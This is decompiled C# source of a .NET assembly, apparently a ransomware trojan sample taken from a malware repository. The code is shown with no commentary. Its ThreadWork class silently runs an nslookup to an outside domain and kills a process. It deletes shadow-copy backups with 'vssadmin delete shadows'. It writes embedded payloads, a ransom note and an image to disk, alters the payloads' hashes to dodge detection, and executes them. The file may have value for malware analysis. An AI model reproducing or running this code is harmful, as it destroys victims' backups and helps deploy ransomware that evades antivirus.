// Decompiled with JetBrains decompiler
// Type: ekati.ThreadWork
// Assembly: ekati, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 64E1DB8A-5658-4D89-86B9-E9E1034C5FE6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Ransom.MSIL.Agent.gen-b933cb32689517aac6e459d33e9d8c7c8f31f0710008bfa09d9e91c2526826ef.exe

using ekati.Properties;
using System;
using System.Diagnostics;
using System.IO;

namespace ekati
{
  internal class ThreadWork
  {
    private static Logger logger = new Logger();
    private static Random random = new Random(Guid.NewGuid().GetHashCode());
    private static bool debug = true;

    public void ThreadOne()
    {
      try
      {
        Process process = new Process();
        process.StartInfo.FileName = "nslookup.exe";
        process.StartInfo.Arguments = "hunter.teamwork.cn";
        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.RedirectStandardError = true;
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.CreateNoWindow = true;
        process.Start();
        process.WaitForExit();
        string str1 = "";
        while (!process.StandardOutput.EndOfStream)
          str1 = str1 + "\t" + process.StandardOutput.ReadLine() + "\r\n";
        string str2 = "";
        while (!process.StandardError.EndOfStream)
          str2 = str2 + "\t" + process.StandardError.ReadLine() + "\r\n";
        if (!ThreadWork.debug)
          return;
        ThreadWork.logger.AddtoLogFile("Executed command: \r\n\t" + process.StartInfo.FileName + " " + process.StartInfo.Arguments + "\r\n");
      }
      catch (Exception ex)
      {
        ThreadWork.logger.AddtoLogFile("Error in ThreadOne: \r\n" + ex.Message);
      }
    }

    public void ThreadTwo()
    {
      try
      {
        Process process = new Process();
        process.StartInfo.FileName = "taskkill.exe";
        process.StartInfo.Arguments = "/IM svchosts.exe";
        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.RedirectStandardError = true;
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.CreateNoWindow = true;
        process.Start();
        process.WaitForExit();
        string str1 = "";
        while (!process.StandardOutput.EndOfStream)
          str1 = str1 + "\t" + process.StandardOutput.ReadLine() + "\r\n";
        string str2 = "";
        while (!process.StandardError.EndOfStream)
          str2 = str2 + "\t" + process.StandardError.ReadLine() + "\r\n";
        if (!ThreadWork.debug)
          return;
        ThreadWork.logger.AddtoLogFile("Executed command: \r\n\t" + process.StartInfo.FileName + " " + process.StartInfo.Arguments + "\r\n");
      }
      catch (Exception ex)
      {
        ThreadWork.logger.AddtoLogFile("Error in ThreadTwo: \r\n" + ex.Message);
      }
    }

    public void ThreadThree()
    {
      try
      {
        Process process = new Process();
        process.StartInfo.FileName = "cmd.exe";
        process.StartInfo.Arguments = "/c vssadmin.exe delete shadows";
        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.RedirectStandardError = true;
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.CreateNoWindow = true;
        process.Start();
        process.WaitForExit();
        string str1 = "";
        while (!process.StandardOutput.EndOfStream)
          str1 = str1 + "\t" + process.StandardOutput.ReadLine() + "\r\n";
        string str2 = "";
        while (!process.StandardError.EndOfStream)
          str2 = str2 + "\t" + process.StandardError.ReadLine() + "\r\n";
        if (!ThreadWork.debug)
          return;
        ThreadWork.logger.AddtoLogFile("Executed command: \r\n\t" + process.StartInfo.FileName + " " + process.StartInfo.Arguments + "\r\n");
      }
      catch (Exception ex)
      {
        ThreadWork.logger.AddtoLogFile("Error in ThreadThree: \r\n" + ex.Message);
      }
    }

    public void ThreadFour()
    {
      try
      {
        string str1 = Path.GetFileNameWithoutExtension(Path.GetRandomFileName()) + ThreadWork.random.Next(1000, 9999).ToString() + ".exe";
        File.WriteAllBytes(str1, Resources.diamond);
        File.WriteAllBytes("message.html", Resources.html);
        File.WriteAllBytes("redback.jpg", Resources.redback);
        this.ChangeHash(str1);
        Process process = new Process();
        process.StartInfo.FileName = "cmd.exe";
        process.StartInfo.Arguments = "/c " + str1;
        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.RedirectStandardError = true;
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.CreateNoWindow = true;
        process.Start();
        process.WaitForExit();
        string str2 = "";
        while (!process.StandardOutput.EndOfStream)
          str2 = str2 + "\t" + process.StandardOutput.ReadLine() + "\r\n";
        string str3 = "";
        while (!process.StandardError.EndOfStream)
          str3 = str3 + "\t" + process.StandardError.ReadLine() + "\r\n";
        if (!ThreadWork.debug)
          return;
        ThreadWork.logger.AddtoLogFile("Executed command (diamond.exe): \r\n\t" + process.StartInfo.FileName + " " + process.StartInfo.Arguments + "\r\n");
      }
      catch (Exception ex)
      {
        ThreadWork.logger.AddtoLogFile("Error in ThreadFour: \r\n" + ex.Message);
      }
    }

    public void ThreadFive()
    {
      try
      {
        string str1 = Path.GetFileNameWithoutExtension(Path.GetRandomFileName()) + ThreadWork.random.Next(1000, 9999).ToString() + ".exe";
        File.WriteAllBytes(str1, Resources.ruby);
        this.ChangeHash(str1);
        Process process = new Process();
        process.StartInfo.FileName = "cmd.exe";
        process.StartInfo.Arguments = "/c " + str1;
        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.RedirectStandardError = true;
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.CreateNoWindow = true;
        process.Start();
        process.WaitForExit();
        string str2 = "";
        while (!process.StandardOutput.EndOfStream)
          str2 = str2 + "\t" + process.StandardOutput.ReadLine() + "\r\n";
        string str3 = "";
        while (!process.StandardError.EndOfStream)
          str3 = str3 + "\t" + process.StandardError.ReadLine() + "\r\n";
        if (!ThreadWork.debug)
          return;
        ThreadWork.logger.AddtoLogFile("Executed command (ruby.exe): \r\n\t" + process.StartInfo.FileName + " " + process.StartInfo.Arguments + "\r\n");
      }
      catch (Exception ex)
      {
        ThreadWork.logger.AddtoLogFile("Error in ThreadFive: \r\n" + ex.Message);
      }
    }

    private void ChangeHash(string fileName)
    {
      try
      {
        byte[] buffer = new byte[256];
        ThreadWork.random.NextBytes(buffer);
        buffer[254] = (byte) 0;
        buffer[(int) byte.MaxValue] = (byte) 0;
        long length = new FileInfo(fileName).Length;
        using (FileStream fileStream = new FileStream(fileName, FileMode.Append))
          fileStream.Write(buffer, 0, buffer.Length);
      }
      catch (Exception ex)
      {
        throw new SystemException("\r\nChangeHash() method:\r\n" + ex.Message, ex);
      }
    }

    public void SetDebug(bool choice) => ThreadWork.debug = choice;
  }
}
